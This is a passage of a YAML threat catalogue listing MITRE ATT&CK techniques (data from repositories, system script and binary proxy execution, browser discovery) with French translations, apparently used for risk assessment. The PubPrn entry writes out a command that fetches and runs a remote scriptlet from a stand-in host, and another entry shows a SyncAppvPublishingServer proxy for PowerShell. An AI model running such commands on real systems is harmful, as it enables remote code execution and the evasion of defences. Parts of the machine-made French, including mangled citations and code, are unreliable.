          * Plateformes de messagerie telles que Slack et Microsoft Teams \n\nDans\
          \ certains cas, des d\xE9p\xF4ts d\u2019informations ont \xE9t\xE9 mal s\xE9\
          curis\xE9s, g\xE9n\xE9ralement en autorisant involontairement un acc\xE8\
          s trop large \xE0 tous les utilisateurs ou m\xEAme un acc\xE8s public \xE0\
          \ des utilisateurs non authentifi\xE9s. Cela est particuli\xE8rement courant\
          \ avec les services natifs ou h\xE9berg\xE9s dans le cloud, tels que AWS\
          \ Relational Database Service (RDS), Redis ou ElasticSearch. (Citation :\
          \ Mitiga)(Citation : TrendMicro Exposed Redis 2020)(Citation : Cybernews\
          \ Reuters Leak 2022)\nhttps://attack.mitre.org/techniques/T1213"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.001
    ref_id: T1213.001
    name: Confluence
    description: 'Adversaries may leverage Confluence repositories to mine valuable
      information. Often found in development environments alongside Atlassian JIRA,
      Confluence is generally used to store development-related documentation, however,
      in general may contain more diverse categories of useful information, such as:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/001'
    translations:
      fr:
        name: Confluence
        description: "Les adversaires peuvent exploiter les d\xE9p\xF4ts Confluence\
          \ pour exploiter des informations pr\xE9cieuses. Souvent pr\xE9sent dans\
          \ les environnements de d\xE9veloppement aux c\xF4t\xE9s d\u2019Atlassian\
          \ JIRA, Confluence est g\xE9n\xE9ralement utilis\xE9 pour stocker de la\
          \ documentation li\xE9e au d\xE9veloppement, cependant, en g\xE9n\xE9ral,\
          \ peut contenir des cat\xE9gories d\u2019informations utiles plus diverses,\
          \ telles que :\n\n* Politiques, proc\xE9dures et normes\n* Diagrammes de\
          \ r\xE9seau physique / logique\n* Diagrammes d\u2019architecture syst\xE8\
          me\n* Documentation technique du syst\xE8me\n* Identifiants de test / d\xE9\
          veloppement (c\u2019est-\xE0-dire, [identifiants non s\xE9curis\xE9s](https://attack.mitre.org/techniques/T1552))\n\
          * Plannings de travail / projets\n* Extraits de code source\n* Liaisons\
          \ vers les partages r\xE9seau et autres ressources internes\nhttps://attack.mitre.org/techniques/T1213/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.002
    ref_id: T1213.002
    name: Sharepoint
    description: 'Adversaries may leverage the SharePoint repository as a source to
      mine valuable information. SharePoint will often contain useful information
      for an adversary to learn about the structure and functionality of the internal
      network and systems. For example, the following is a list of example information
      that may hold potential value to an adversary and may also be found on SharePoint:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/002'
    translations:
      fr:
        name: SharePoint
        description: "Les adversaires peuvent utiliser le d\xE9p\xF4t SharePoint comme\
          \ source pour exploiter des informations pr\xE9cieuses. SharePoint contiendra\
          \ souvent des informations utiles pour qu\u2019un adversaire puisse apprendre\
          \ la structure et la fonctionnalit\xE9 du r\xE9seau et des syst\xE8mes internes.\
          \ Par exemple, voici une liste d\u2019informations d\u2019exemple qui pourraient\
          \ avoir une valeur potentielle pour un adversaire et qui peuvent \xE9galement\
          \ \xEAtre trouv\xE9es sur SharePoint :\n\n* Politiques, proc\xE9dures et\
          \ normes\n* Diagrammes de r\xE9seau physique / logique\n* Diagrammes d\u2019\
          architecture syst\xE8me\n* Documentation technique du syst\xE8me\n* Identifiants\
          \ de test / d\xE9veloppement (c\u2019est-\xE0-dire, [identifiants non s\xE9\
          curis\xE9s](https://attack.mitre.org/techniques/T1552))\n* Plannings de\
          \ travail / projets\n* Extraits de code source\n* Liaisons vers les partages\
          \ r\xE9seau et autres ressources internes\nhttps://attack.mitre.org/techniques/T1213/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.003
    ref_id: T1213.003
    name: Code Repositories
    description: 'Adversaries may leverage code repositories to collect valuable information.
      Code repositories are tools/services that store source code and automate software
      builds. They may be hosted internally or privately on third party sites such
      as Github, GitLab, SourceForge, and BitBucket. Users typically interact with
      code repositories through a web application or command-line utilities such as
      git.


      Once adversaries gain access to a victim network or a private code repository,
      they may collect sensitive information such as proprietary source code or [Unsecured
      Credentials](https://attack.mitre.org/techniques/T1552) contained within software''s
      source code.  Having access to software''s source code may allow adversaries
      to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while
      credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:
      Wired Uber Breach)(Citation: Krebs Adobe)


      **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003),
      which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      via public code repositories.

      https://attack.mitre.org/techniques/T1213/003'
    translations:
      fr:
        name: "D\xE9p\xF4ts de code"
        description: "Les adversaires peuvent utiliser les d\xE9p\xF4ts de code pour\
          \ collecter des informations pr\xE9cieuses. Les d\xE9p\xF4ts de code sont\
          \ des outils/services qui stockent le code source et automatisent la construction\
          \ de logiciels. Ils peuvent \xEAtre h\xE9berg\xE9s en interne ou en priv\xE9\
          \ sur des sites tiers tels que Github, GitLab, SourceForge et BitBucket.\
          \ Les utilisateurs interagissent g\xE9n\xE9ralement avec des d\xE9p\xF4\
          ts de code via une application web ou des utilitaires en ligne de commande\
          \ tels que git.\n\nUne fois que les adversaires ont acc\xE8s \xE0 un r\xE9\
          seau victime ou \xE0 un d\xE9p\xF4t de code priv\xE9, ils peuvent collecter\
          \ des informations sensibles telles que le code source propri\xE9taire ou\
          \ les [identifiants non s\xE9curis\xE9s](https://attack.mitre.org/techniques/T1552)\
          \ contenus dans le code source du logiciel.  Avoir acc\xE8s au code source\
          \ du logiciel peut permettre aux adversaires de d\xE9velopper des [Exploits](https://attack.mitre.org/techniques/T1587/004),\
          \ tandis que les identifiants peuvent permettre d\u2019acc\xE9der \xE0 des\
          \ ressources suppl\xE9mentaires via [Comptes valides](https://attack.mitre.org/techniques/T1078).\
          \ (Citation : Uber Breach)(Citation : Krebs Adobe)\n\n**Note :** Ceci se\
          \ distingue des [D\xE9p\xF4ts de Code](https://attack.mitre.org/techniques/T1593/003),\
          \ qui se concentrent sur la conduite de [Reconnaissance](https://attack.mitre.org/tactics/TA0043)\
          \ via des d\xE9p\xF4ts publics de code.\nhttps://attack.mitre.org/techniques/T1213/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.004
    ref_id: T1213.004
    name: Customer Relationship Management Software
    description: "Adversaries may leverage Customer Relationship Management (CRM)\
      \ software to mine valuable information. CRM software is used to assist organizations\
      \ in tracking and managing customer interactions, as well as storing customer\
      \ data.\n\nOnce adversaries gain access to a victim organization, they may mine\
      \ CRM software for customer data. This may include personally identifiable information\
      \ (PII) such as full names, emails, phone numbers, and addresses, as well as\
      \ additional details such as purchase histories and IT support interactions.\
      \ By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ emails, engage in SIM swapping, or otherwise target the organization\u2019\
      s customers in ways that enable financial gain or the compromise of additional\
      \ organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation:\
      \ Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank\
      \ Hack 2020)\n\nCRM software may be hosted on-premises or in the cloud. Information\
      \ stored in these solutions may vary based on the specific instance or environment.\
      \ Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho,\
      \ Zendesk, and HubSpot.\nhttps://attack.mitre.org/techniques/T1213/004"
    translations:
      fr:
        name: Logiciel de gestion de la relation client
        description: "Les adversaires peuvent utiliser un logiciel de gestion de la\
          \ relation client (CRM) pour exploiter des informations pr\xE9cieuses. Les\
          \ logiciels CRM sont utilis\xE9s pour aider les organisations \xE0 suivre\
          \ et g\xE9rer les interactions avec les clients, ainsi qu\u2019\xE0 stocker\
          \ les donn\xE9es clients.\n\nUne fois que les adversaires ont acc\xE8s \xE0\
          \ une organisation victime, ils peuvent exploiter des logiciels CRM pour\
          \ des donn\xE9es clients. Cela peut inclure des informations personnelles\
          \ identifiables (PII) telles que les noms complets, les e-mails, les num\xE9\
          ros de t\xE9l\xE9phone et adresses, ainsi que des d\xE9tails suppl\xE9mentaires\
          \ tels que l\u2019historique des achats et les interactions avec le support\
          \ informatique. En collectant ces donn\xE9es, un adversaire peut envoyer\
          \ des e-mails personnalis\xE9s [Phishing](https://attack.mitre.org/techniques/T1566),\
          \ s\u2019engager dans l\u2019\xE9change de cartes SIM ou cibler les clients\
          \ de l\u2019organisation de mani\xE8re \xE0 permettre un gain financier\
          \ ou la compromission d\u2019autres organisations. (Citation : Piratage\
          \ cellulaire US Computer bleeping 2022)(Citation : Hack Computer Mint Mobile\
          \ 2021)(Citation : Piratage de la banque informatique bip\xE9e 2020)\n\n\
          Les logiciels CRM peuvent \xEAtre h\xE9berg\xE9s sur site ou dans le cloud.\
          \ Les informations stock\xE9es dans ces solutions peuvent varier selon l\u2019\
          instance ou l\u2019environnement sp\xE9cifique. Parmi les exemples de logiciels\
          \ CRM figurent Microsoft Dynamics 365, Salesforce, Zoho, Zendesk et HubSpot.\n\
          https://attack.mitre.org/techniques/T1213/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.005
    ref_id: T1213.005
    name: Messaging Applications
    description: "Adversaries may leverage chat and messaging applications, such as\
      \ Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\
      \nThe following is a brief list of example information that may hold potential\
      \ value to an adversary and may also be found on messaging applications: \n\n\
      * Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008))\
      \ \n* Source code snippets \n* Links to network shares and other internal resources\
      \ \n* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)\n* Discussions\
      \ about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker\
      \ 2021)(Citation: Microsoft DEV-0537)\n\nIn addition to exfiltrating data from\
      \ messaging applications, adversaries may leverage data from chat messages in\
      \ order to improve their targeting - for example, by learning more about an\
      \ environment or evading ongoing incident response efforts.(Citation: Sentinel\
      \ Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)\nhttps://attack.mitre.org/techniques/T1213/005"
    translations:
      fr:
        name: Applications de messagerie
        description: "Les adversaires peuvent exploiter des applications de chat et\
          \ de messagerie, telles que Microsoft Teams, Google Chat et Slack, pour\
          \ exploiter des informations pr\xE9cieuses.  \n\nVoici une br\xE8ve liste\
          \ d\u2019exemples d\u2019informations pouvant avoir une valeur potentielle\
          \ pour un adversaire et qui peuvent \xE9galement \xEAtre trouv\xE9es sur\
          \ des applications de messagerie : \n\n* Identifiants de test / d\xE9veloppement\
          \ (c\u2019est-\xE0-dire, [Messages de chat](https://attack.mitre.org/techniques/T1552/008))\
          \ \n* Extraits de code source \n* Liaisons vers les partages r\xE9seau et\
          \ autres ressources internes \n* Donn\xE9es propri\xE9taires (Citation :\
          \ Guardian Grand Theft Auto Leak 2022)\n* Discussions sur les efforts en\
          \ cours de r\xE9ponse aux incidents (Citation : SC Magazine Ragnar Locker\
          \ 2021) (Citation : Microsoft DEV-0537)\n\nEn plus d\u2019exfiltrer les\
          \ donn\xE9es des applications de messagerie, les adversaires peuvent exploiter\
          \ les donn\xE9es des messages de discussion afin d\u2019am\xE9liorer leur\
          \ ciblage \u2013 par exemple, en apprenant davantage sur un environnement\
          \ ou en \xE9vitant les efforts de r\xE9ponse aux incidents en cours. (Citation\
          \ : Sentinel Labs NullBulge 2024)(Citation : Permiso Scattered Spider 2023)\n\
          https://attack.mitre.org/techniques/T1213/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.006
    ref_id: T1213.006
    name: Databases
    description: "Adversaries may leverage databases to mine valuable information.\
      \ These databases may be hosted on-premises or in the cloud (both in platform-as-a-service\
      \ and software-as-a-service environments). \n\nExamples of databases from which\
      \ information may be collected include MySQL, PostgreSQL, MongoDB, Amazon Relational\
      \ Database Service, Azure SQL Database, Google Firebase, and Snowflake. Databases\
      \ may include a variety of information of interest to adversaries, such as usernames,\
      \ hashed passwords, personally identifiable information, and financial data.\
      \ Data collected from databases may be used for [Lateral Movement](https://attack.mitre.org/tactics/TA0008),\
      \ [Command and Control](https://attack.mitre.org/tactics/TA0011), or [Exfiltration](https://attack.mitre.org/tactics/TA0010).\
      \ Data exfiltrated from databases may also be used to extort victims or may\
      \ be sold for profit.(Citation: Google Cloud Threat Intelligence UNC5537 Snowflake\
      \ 2024)\nhttps://attack.mitre.org/techniques/T1213/006"
    translations:
      fr:
        name: "Bases de donn\xE9es"
        description: "Les adversaires peuvent exploiter les bases de donn\xE9es pour\
          \ exploiter des informations pr\xE9cieuses. Ces bases de donn\xE9es peuvent\
          \ \xEAtre h\xE9berg\xE9es sur site ou dans le cloud (\xE0 la fois dans des\
          \ environnements de plateforme en tant que service et logiciel en tant que\
          \ service). \n\nParmi les exemples de bases de donn\xE9es \xE0 partir desquelles\
          \ l\u2019on peut collecter des informations figurent MySQL, PostgreSQL,\
          \ MongoDB, Amazon Relational Database Service, Azure SQL Database, Google\
          \ Firebase et Snowflake. Les bases de donn\xE9es peuvent inclure une vari\xE9\
          t\xE9 d\u2019informations int\xE9ressantes pour les adversaires, telles\
          \ que des noms d\u2019utilisateur, des mots de passe hach\xE9s, des informations\
          \ personnelles identifiables et des donn\xE9es financi\xE8res. Les donn\xE9\
          es collect\xE9es \xE0 partir de bases de donn\xE9es peuvent \xEAtre utilis\xE9\
          es pour [D\xE9placement lat\xE9ral](https://attack.mitre.org/tactics/TA0008),\
          \ [Commandement et Contr\xF4le](https://attack.mitre.org/tactics/TA0011)\
          \ ou [Exfiltration](https://attack.mitre.org/tactics/TA0010). Les donn\xE9\
          es exfiltr\xE9es des bases de donn\xE9es peuvent \xE9galement \xEAtre utilis\xE9\
          es pour extorquer des victimes ou \xEAtre vendues \xE0 des fins lucratives.\
          \ (Citation : Google Cloud Threat Intelligence UNC5537 Snowflake 2024)\n\
          https://attack.mitre.org/techniques/T1213/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216
    ref_id: T1216
    name: System Script Proxy Execution
    description: 'Adversaries may use trusted scripts, often signed with certificates,
      to proxy the execution of malicious files. Several Microsoft signed scripts
      that have been downloaded from Microsoft or are default on Windows installations
      can be used to proxy execution of other files.(Citation: LOLBAS Project) This
      behavior may be abused by adversaries to execute malicious files that could
      bypass application control and signature validation on systems.(Citation: GitHub
      Ultimate AppLocker Bypass List)

      https://attack.mitre.org/techniques/T1216'
    translations:
      fr:
        name: "Ex\xE9cution de proxy System Script"
        description: "Les adversaires peuvent utiliser des scripts de confiance, souvent\
          \ sign\xE9s avec des certificats, pour proxy l\u2019ex\xE9cution de fichiers\
          \ malveillants. Plusieurs scripts sign\xE9s par Microsoft t\xE9l\xE9charg\xE9\
          s depuis Microsoft ou par d\xE9faut sur les installations Windows peuvent\
          \ \xEAtre utilis\xE9s pour proxy l\u2019ex\xE9cution d\u2019autres fichiers.\
          \ (Citation : Projet LOLBAS) Ce comportement peut \xEAtre abus\xE9 par les\
          \ adversaires pour ex\xE9cuter des fichiers malveillants qui pourraient\
          \ contourner le contr\xF4le des applications et la validation des signatures\
          \ sur les syst\xE8mes. (Citation : Liste de contournement GitHub Ultimate\
          \ AppLocker)\nhttps://attack.mitre.org/techniques/T1216"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.001
    ref_id: T1216.001
    name: PubPrn
    description: 'Adversaries may use PubPrn to proxy execution of malicious remote
      files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005)
      script that publishes a printer to Active Directory Domain Services. The script
      may be signed by Microsoft and is commonly executed through the [Windows Command
      Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.
      For example, the following code publishes a printer within the specified domain:
      <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation:
      pubprn)


      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote
      sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the
      second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted
      on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>.
      This behavior may bypass signature validation restrictions and application control
      solutions that do not account for abuse of this script.


      In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated
      to prevent proxying execution from a remote site. This is done by limiting the
      protocol specified in the second parameter to <code>LDAP://</code>, vice the
      <code>script:</code> moniker which could be used to reference remote code via
      HTTP(S).

      https://attack.mitre.org/techniques/T1216/001'
    translations:
      fr:
        name: PubPrn
        description: "Les adversaires peuvent utiliser PubPrn pour proxy l\u2019ex\xE9\
          cution de fichiers distants malveillants. PubPrn.vbs est un script [Visual\
          \ Basic](https://attack.mitre.org/techniques/T1059/005) qui publie une imprimante\
          \ vers Active Directory Domain Services. Le script peut \xEAtre sign\xE9\
          \ par Microsoft et est couramment ex\xE9cut\xE9 via le [Windows Command\
          \ Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.\
          \ Par exemple, le code suivant publie une imprimante dans le domaine sp\xE9\
          cifi\xE9 : <code>cscript pubprn Printer1 LDAP\_://CN=Container1,DC=Domain1,DC=Com</code>.\
          \ (Citation : pubprn)\n\nLes adversaires peuvent abuser de PubPrn pour ex\xE9\
          cuter des charges utiles malveillantes h\xE9berg\xE9es sur des sites distants.\
          \ (Citation : Enigma0x3 PubPrn Bypass) Pour ce faire, les adversaires peuvent\
          \ d\xE9finir le second <code>param\xE8tre script\_:</code> pour r\xE9f\xE9\
          rencer un fichier scriptlet (.sct) h\xE9berg\xE9 sur un site distant. Un\
          \ exemple de commande est <code>pubprn.vbs 127.0.0.1 script : https\_://mydomain.com/folder/file.sct</code>.\
          \ Ce comportement peut contourner les restrictions de validation des signatures\
          \ et les solutions de contr\xF4le d\u2019application qui ne prennent pas\
          \ en compte les abus de ce script.\n\nDans les versions ult\xE9rieures de\
          \ Windows (10+), <code>PubPrn.vbs</code> a \xE9t\xE9 mis \xE0 jour pour\
          \ emp\xEAcher l\u2019ex\xE9cution de proxys depuis un site distant. Cela\
          \ se fait en limitant le protocole sp\xE9cifi\xE9 dans le second param\xE8\
          tre \xE0 <code>LDAP://</code>, au lieu du <code>script :</code> moniker\
          \ qui pouvait \xEAtre utilis\xE9 pour r\xE9f\xE9rencer du code distant via\
          \ HTTP(S).\nhttps://attack.mitre.org/techniques/T1216/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.002
    ref_id: T1216.002
    name: SyncAppvPublishingServer
    description: "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution\
      \ of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.\
      \ SyncAppvPublishingServer.vbs is a Visual Basic script associated with how\
      \ Windows virtualizes applications (Microsoft Application Virtualization, or\
      \ App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications\
      \ to users as virtual applications, allowing users to launch and interact with\
      \ them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 -\
      \ appv)\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be\
      \ signed by Microsoft, and is commonly executed from `\\System32` through the\
      \ command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)\n\n\
      Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ execution restrictions and evade defensive counter measures by \"living off\
      \ the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may\
      \ function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation:\
      \ 7 - appv)\n\nFor example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ commands may be invoked using:(Citation: 5 - appv)\n\n`SyncAppvPublishingServer.vbs\
      \ \"n; {PowerShell}\"`\nhttps://attack.mitre.org/techniques/T1216/002"
    translations:
      fr:
        name: SyncAppvPublishingServer
        description: "Les adversaires peuvent abuser de SyncAppvPublishingServer.vbs\
          \ pour proxy l\u2019ex\xE9cution de commandes malveillantes [PowerShell](https://attack.mitre.org/techniques/T1059/001).\
          \ SyncAppvPublishingServer.vbs est un script Visual Basic associ\xE9 \xE0\
          \ la virtualisation des applications par Windows (Microsoft Application\
          \ Virtualization, ou App-V). (Citation : 1 - appv) Par exemple, Windows\
          \ peut rendre les applications Win32 aux utilisateurs sous forme d\u2019\
          applications virtuelles, permettant ainsi de les lancer et d\u2019interagir\
          \ avec elles comme si elles \xE9taient install\xE9es localement. (Citation\
          \ : 2 - appv)(Citation : 3 - appv)\n    \nLe script SyncAppvPublishingServer.vbs\
          \ est l\xE9gitime, peut \xEAtre sign\xE9 par Microsoft, et est couramment\
          \ ex\xE9cut\xE9 depuis '\\System32' via la ligne de commande via 'wscript.exe'.\
          \ (Citation : 4 - appv)(Citation : 5 - appv)\n\nLes adversaires peuvent\
          \ abuser de SyncAppvPublishingServer.vbs pour contourner les restrictions\
          \ d\u2019ex\xE9cution de [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ et contourner les contre-mesures d\xE9fensives en \xAB vivant de la terre\
          \ \xBB. (Citation : 6 - appv)(Citation : 4 - appv) L\u2019ex\xE9cution par\
          \ proxy peut fonctionner comme une alternative de confiance/sign\xE9e \xE0\
          \ l\u2019invocation directe de \xAB powershell.exe \xBB. (Citation : 7 -\
          \ appv)\n\nPar exemple, les commandes [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ peuvent \xEAtre invoqu\xE9es en utilisant : (Citation : 5 - appv)\n\n\
          'SyncAppvPublishingServer.vbs \"n\_; {PowerShell}\"'\nhttps://attack.mitre.org/techniques/T1216/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1217
    ref_id: T1217
    name: Browser Information Discovery
    description: 'Adversaries may enumerate information about browsers to learn more
      about compromised environments. Data saved by browsers (such as bookmarks, accounts,
      and browsing history) may reveal a variety of personal information about users
      (e.g., banking sites, relationships/interests, social media, etc.) as well as
      details about internal network resources such as servers, tools/dashboards,
      or other related infrastructure.(Citation: Kaspersky Autofill)


      Browser information may also highlight additional targets after an adversary
      has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)
      associated with logins cached by a browser.


      Specific storage locations vary based on platform and/or application, but browser
      information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation:
      Chrome Roaming Profiles)

      https://attack.mitre.org/techniques/T1217'
    translations:
      fr:
        name: "D\xE9couverte d\u2019informations sur navigateur"
        description: "Les adversaires peuvent \xE9num\xE9rer des informations sur\
          \ les navigateurs pour en apprendre davantage sur les environnements compromis.\
          \ Les donn\xE9es sauvegard\xE9es par les navigateurs (comme les favoris,\
          \ les comptes et l\u2019historique de navigation) peuvent r\xE9v\xE9ler\
          \ une vari\xE9t\xE9 d\u2019informations personnelles sur les utilisateurs\
          \ (par exemple, sites bancaires, relations/centres d\u2019int\xE9r\xEAt,\
          \ r\xE9seaux sociaux, etc.) ainsi que des d\xE9tails sur les ressources\
          \ r\xE9seau internes telles que les serveurs, les outils/tableaux de bord\
          \ ou d\u2019autres infrastructures associ\xE9es. (Citation : Kaspersky Autofill)\n\
          \nLes informations du navigateur peuvent \xE9galement mettre en \xE9vidence\
          \ des cibles suppl\xE9mentaires apr\xE8s qu\u2019un adversaire ait acc\xE8\
          s \xE0 des identifiants valides, en particulier [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)\
          \ associ\xE9s aux identifiants mis en cache par un navigateur.\n\nLes emplacements\
          \ de stockage sp\xE9cifiques varient selon la plateforme et/ou l\u2019application,\
          \ mais les informations du navigateur sont g\xE9n\xE9ralement stock\xE9\
          es dans des fichiers locaux et des bases de donn\xE9es (par exemple, \xAB\
          \ %APPDATA\_%/Google/Chrome \xBB). (Citation : Profils itin\xE9rants Chrome)\n\
          https://attack.mitre.org/techniques/T1217"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218
    ref_id: T1218
    name: System Binary Proxy Execution
    description: 'Adversaries may bypass process and/or signature-based defenses by
      proxying execution of malicious content with signed, or otherwise trusted, binaries.
      Binaries used in this technique are often Microsoft-signed files, indicating
      that they have been either downloaded from Microsoft or are already native in
      the operating system.(Citation: LOLBAS Project) Binaries signed with trusted
      digital certificates can typically execute on Windows systems protected by digital
      signature validation. Several Microsoft signed binaries that are default on
      Windows installations can be used to proxy execution of other files or commands.


      Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code>
      to proxy execution of malicious commands.(Citation: split man page)(Citation:
      GTFO split)

      https://attack.mitre.org/techniques/T1218'
    translations:
      fr:
        name: "Ex\xE9cution du proxy binaire syst\xE8me"
        description: "Les adversaires peuvent contourner les d\xE9fenses bas\xE9es\
          \ sur les processus et/ou les signatures en proxy l\u2019ex\xE9cution de\
          \ contenus malveillants avec des binaires sign\xE9s ou autrement dignes\
          \ de confiance. Les binaires utilis\xE9s dans cette technique sont souvent\
          \ des fichiers sign\xE9s par Microsoft, indiquant qu\u2019ils ont \xE9t\xE9\
          \ t\xE9l\xE9charg\xE9s depuis Microsoft ou qu\u2019ils sont d\xE9j\xE0 natifs\
          \ dans le syst\xE8me d\u2019exploitation. (Citation : Projet LOLBAS) Les\
          \ binaires sign\xE9s avec des certificats num\xE9riques de confiance peuvent\
          \ g\xE9n\xE9ralement s\u2019ex\xE9cuter sur des syst\xE8mes Windows prot\xE9\
          g\xE9s par la validation de signature num\xE9rique. Plusieurs binaires sign\xE9\
          s par Microsoft, par d\xE9faut sur les installations Windows, peuvent \xEA\
          tre utilis\xE9s pour proxy l\u2019ex\xE9cution d\u2019autres fichiers ou\
          \ commandes.\n\nDe m\xEAme, sur les syst\xE8mes Linux, les adversaires peuvent\
          \ abuser de binaires de confiance, comme l\u2019ex\xE9cution <code>par scindement</code>\
          \ en proxy de commandes malveillantes. (Citation : page \xE0 homme divis\xE9\
          )(Citation : partez du groupe)\nhttps://attack.mitre.org/techniques/T1218"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.001
    ref_id: T1218.001
    name: Compiled HTML File
    description: 'Adversaries may abuse Compiled HTML files (.chm) to conceal malicious
      code. CHM files are commonly distributed as part of the Microsoft HTML Help
      system. CHM files are compressed compilations of various content such as HTML
      documents, images, and scripting/web related programming languages such VBA,
      JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content
      is displayed using underlying components of the Internet Explorer browser (Citation:
      Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe).
      (Citation: Microsoft HTML Help Executable Program)


      A custom CHM file containing embedded payloads could be delivered to a victim
      then triggered by [User Execution](https://attack.mitre.org/techniques/T1204).
      CHM execution may also bypass application application control on older and/or
      unpatched systems that do not account for execution of binaries through hh.exe.
      (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)

      https://attack.mitre.org/techniques/T1218/001'
    translations:
      fr:
        name: "Fichier HTML compil\xE9"
        description: "Les adversaires peuvent abuser des fichiers HTML compil\xE9\
          s (.chm) pour dissimuler du code malveillant. Les fichiers CHM sont couramment\
          \ distribu\xE9s dans le cadre du syst\xE8me d\u2019aide Microsoft HTML.\
          \ Les fichiers CHM sont des compilations compress\xE9es de divers contenus\
          \ tels que des documents HTML, des images et des langages de programmation\
          \ li\xE9s au script/web tels que VBA, JScript, Java et ActiveX. (Citation\
          \ : Aide Microsoft HTML mai 2018) Le contenu CHM est affich\xE9 \xE0 l\u2019\
          aide des composants sous-jacents du navigateur Internet Explorer (Citation\
          \ : Microsoft HTML Help ActiveX) charg\xE9s par le programme ex\xE9cutable\
          \ HTML Help (hh.exe). (Citation : Programme ex\xE9cutable d\u2019aide HTML\
          \ Microsoft)\n\nUn fichier CHM personnalis\xE9 contenant des charges utiles\
          \ int\xE9gr\xE9es pouvait \xEAtre livr\xE9 \xE0 une victime puis d\xE9clench\xE9\
          \ par [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204).\
          \ L\u2019ex\xE9cution du CHM peut \xE9galement contourner le contr\xF4le\
          \ des applications sur les syst\xE8mes plus anciens et/ou non patch\xE9\
          s qui ne prennent pas en compte l\u2019ex\xE9cution des binaires via hh.exe.\
          \ (Citation : MsitPros CHM ao\xFBt 2017) (Citation : Microsoft CVE-2017-8625\
          \ ao\xFBt 2017)\nhttps://attack.mitre.org/techniques/T1218/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.002
    ref_id: T1218.002
    name: Control Panel
    description: 'Adversaries may abuse control.exe to proxy execution of malicious
      payloads. The Windows Control Panel process binary (control.exe) handles execution
      of Control Panel items, which are utilities that allow users to view and adjust
      computer settings.


      Control Panel items are registered executable (.exe) or Control Panel (.cpl)
      files, the latter are actually renamed dynamic-link library (.dll) files that
      export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation:
      TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically
      include graphical menus available to users after being registered and loaded
      into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel
      items can be executed directly from the command line, programmatically via an
      application programming interface (API) call, or by simply double-clicking the
      file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware
      Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)


      Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL
      Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo
